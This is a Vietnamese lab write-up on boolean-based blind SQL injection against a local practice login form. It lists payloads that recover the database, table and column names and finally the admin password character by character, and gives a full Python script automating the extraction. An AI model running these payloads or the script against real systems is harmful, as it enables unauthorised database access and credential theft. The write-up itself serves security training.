## Boolean Based SQLi

`Description:` 1 form đăng nhập với `username` và `password`:

![image](https://user-images.githubusercontent.com/92881216/220998149-9c1298bc-30f6-4f75-b033-57325355bf51.png)

Đầu tiên test với giá trị bật kỳ và nhận được `incorrect!`, sau đó em thử với `a' or '1'='1` và nhận được `correct!!!`.

Như vậy dù không dump được ra dữ liệu quan trọng nào nhưng có thể xác định được payload đúng hay sai dựa vào web content.

<img src="https://user-images.githubusercontent.com/92881216/220999000-278703c4-b71e-40e8-b083-28859d4391a5.png" width=500px /> <img src="https://user-images.githubusercontent.com/92881216/220998908-4cfcaab0-29b5-4f41-aa80-706e5f4f752a.png" width=500px />

**Khai thác:**

- Xác định database:
  - Xác định độ dài tên db: payload `1' or (length(database()))=i; -- -` với i là độ dài và xem thông báo trả về.
  - Xác định tên db khi biết độ dài: payload `1' or substr((select database()),i,1)='j'; -- -` với thứ tự i ứng với ký tự j
- Xác đinh bảng khi biết db:
  - Xác đinh độ dài tên bảng: payload `1' or (SELECT length(table_name) FROM information_schema.tables WHERE table_schema = '{db}')=i  -- -` với i là độ dài
  - Xác định tên bảng: payload `1' or substr((SELECT table_name FROM information_schema.tables WHERE table_schema = '{db}'),i,1)='j'; -- -` với i là thứ tự ứng với ký tự j.
- Xác định cột khi biết bảng:
  - Xác định độ dài cột: payload `1' or (select length(column_name) from information_schema.columns where table_name='{table_name}')=i  -- -`.
  - Xác định tên cột: payload `1' or substr((select column_name from information_schema.columns where table_name='{table_name}'),i,1)='j'; -- -`.
- Xác địn password: 
  - Xác định độ dài password: payload `1' or (SELECT length(password) from {table_name} WHERE username = 0x61646d696e)={}  -- -`  (0x61646d696e giải mã hex là 'admin')
  - Xác định password: payload `1' or substr((SELECT password from {table_name} WHERE username = 0x61646d696e),i,1)='j'; -- -`.

`Script:` (Ở đây em thêm limit do có nhiều bảng, cột và điều chỉnh số dòng cần lấy qua limit cho đúng bảng, cột để khai thác)
```
import requests
import string
LETTERS=string.ascii_lowercase+string.ascii_uppercase+string.digits+'_'+'|'
url = "http://localhost:8080/kcsc/task3/boolean_based_sqli/"

db_length=0
for i in range(1,31):
    data= {
        'username' : "1' or (length(database()))={}; -- -".format(i),
        'password' : "test"   
    }
    res= requests.post(url, data=data)
    if 'correct!!!' in res.text:
        print(i)
        db_length=i
        break

db_name=''    
for i in range(1,db_length+1):
    for j in LETTERS:
        data= {
        'username' : "1' or substr((select database()),{},1)='{}'; -- -".format(i,j),
        'password' : "test"   
        }
        res= requests.post(url, data=data)
        if 'correct!!!' in res.text:
            db_name+=j
            print('db_name: ',db_name)
            break

table_length=0
for i in range(1,30):
    data= {
        'username' : "1' or (SELECT length(table_name) FROM information_schema.tables WHERE table_schema = '{}' limit 1 ,2)={}  -- -".format(db_name,i),
        'password' : "test"   
    }
    res= requests.post(url, data=data)
    if 'correct!!!' in res.text:
        print(i)
        table_length=i
        break

table_name=''    
for i in range(1,table_length+1):
    for j in LETTERS:
        data= {
        'username' : "1' or substr((SELECT table_name FROM information_schema.tables WHERE table_schema = '{}' limit 1 ,2),{},1)='{}'; -- -".format(db_name,i,j),
        'password' : "test"   
        }
        res= requests.post(url, data=data)
        if 'correct!!!' in res.text:
            table_name+=j
            print('tables_name: ',table_name)
            break

column_length=0
for i in range(1,30):
    data= {
        'username' : "1' or (select length(column_name) from information_schema.columns where table_name='{}' limit 2,1)={}  -- -".format(table_name,i),
        'password' : "test"   
    }
    res= requests.post(url, data=data)
    if 'correct!!!' in res.text:
        print(i)
        column_length=i
        break

column_name=''    
for i in range(1,column_length+1):
    for j in LETTERS:
        data= {
        'username' : "1' or substr((select column_name from information_schema.columns where table_name='{}' limit 2,1),{},1)='{}'; -- -".format(table_name,i,j),
        'password' : "test"   
        }
        res= requests.post(url, data=data)
        if 'correct!!!' in res.text:
            column_name+=j
            print('column_name: ',column_name)
            break

pw_length=0
for i in range(1,30):
    data= {
        'username' : "1' or (SELECT length(password) from {} WHERE username = 0x61646d696e)={}  -- -".format(table_name,i),
        'password' : "test"   
    }
    res= requests.post(url, data=data)
    if 'correct!!!' in res.text:
        print(i)
        pw_length=i
        break

pw=''    
for i in range(1,pw_length+1):
    for j in LETTERS:
        data= {
        'username' : "1' or substr((SELECT password from {} WHERE username = 0x61646d696e),{},1)='{}'; -- -".format(table_name,i,j),
        'password' : "test"   
        }
        res= requests.post(url, data=data)
        if 'correct!!!' in res.text:
            pw+=j
            print('pw: ',pw)
            break
```

Kết quả: 

![image](https://user-images.githubusercontent.com/92881216/221003277-d91bb8ed-640e-4278-a0af-4eedb5f50126.png)


> password admin: `the_admin_password`
